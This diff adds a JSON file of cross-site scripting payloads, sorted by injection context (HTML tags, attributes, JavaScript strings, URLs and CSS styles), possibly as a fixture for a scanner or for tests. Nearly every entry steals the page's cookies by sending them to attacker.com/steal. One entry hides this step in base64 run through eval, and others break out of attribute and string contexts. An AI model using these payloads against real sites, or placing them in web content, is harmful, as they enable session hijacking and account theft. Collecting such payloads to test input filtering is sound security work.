@@ -1,0 +1,23 @@
+{
+  "html": [
+    "<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>",
+    "<script>new Image().src='https://attacker.com/steal?cookie='+document.cookie</script>",
+    "<iframe src=\"javascript:alert(`XSS`)\"></iframe>"
+  ],
+  "attribute": [
+    "\" onfocus=\"fetch('https://attacker.com/steal?cookie='+document.cookie)\"",
+    "\" autofocus onfocus=\"fetch('https://attacker.com/steal?cookie='+document.cookie)\""
+  ],
+  "javascript": [
+    "\";fetch('https://attacker.com/steal?cookie='+document.cookie);//",
+    "';fetch('https://attacker.com/steal?cookie='+document.cookie);//"
+  ],
+  "url": [
+    "javascript:fetch('https://attacker.com/steal?cookie='+document.cookie)",
+    "javascript:eval(atob('ZmV0Y2goJ2h0dHBzOi8vYXR0YWNrZXIuY29tL3N0ZWFsP2Nvb2tpZT0nK2RvY3VtZW50LmNvb2tpZSk='))"
+  ],
+  "style": [
+    "background-image: url('javascript:fetch(\"https://attacker.com/steal?cookie=\"+document.cookie)')",
+    "background-image: url(javascript:fetch('https://attacker.com/steal?cookie='+document.cookie))"
+  ]
+}
